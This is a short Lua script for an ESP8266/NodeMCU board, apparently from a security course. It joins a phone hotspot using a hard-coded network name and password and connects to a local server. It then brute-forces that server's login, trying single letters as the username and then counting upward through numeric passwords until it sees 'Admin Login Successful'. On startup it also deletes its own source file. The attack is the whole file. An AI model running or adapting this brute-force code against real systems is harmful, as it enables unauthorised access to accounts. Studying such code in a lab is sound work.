file.remove("CS530.lua")
wifi.sta.disconnect()


character = {'a','b','c','d','e','f','g','h','i','j',
'k','l','m','n','o','p','q','r','s','t','u','v','w',
'x','y','z'}

print(wifi.sta.getip())
wifi.setmode(wifi.STATION)
wifi.sta.config("Alex's iPhone","19911012")

tmr.delay(100000)
tmr.delay(100000)
tmr.delay(100000)
tmr.delay(100000)
tmr.delay(100000)
tmr.delay(100000)

print(wifi.sta.getip())

conn = net.createConnection(net.TCP, false)
conn:connect(27015,"172.20.10.11")




conn:on("receive", function(conn, pl) print(pl) end)
conn:send("aa")
conn:on("receive", function(conn, pl) print(pl) end)
conn:on("connection", function(conn,payload)
end)
conn:on("receive", function(conn, payload)
msg = string.sub(payload,string.find(payload,"")+0,string.find(payload,"")+50)
end)

i = 1
tmr.alarm(2, 1000, 1, function()
    print(msg)
    conn:send(character[i])
    tmr.delay(100000)
    tmr.delay(100000)
    print(character[i])
    i = i + 1
    
    
    if msg == "Username Crrect, Please enter the Password" then tmr.stop(2) end y = 1
tmr.alarm(1, 1000, 1, function()
    print(msg)
    conn:send(y)
    tmr.delay(100000)
    tmr.delay(100000)
    print(y)
    y = y + 1
    
    
    if msg == "Admin Login Successful" then tmr.stop(1) end end) end) 



    

--conn:send("wertyuikjhgfdsadfghjhgfdsasdfghgfdsasdghjhgfdsasdfghgfdsasdaa")
--conn:send("12345")
--print(msg)
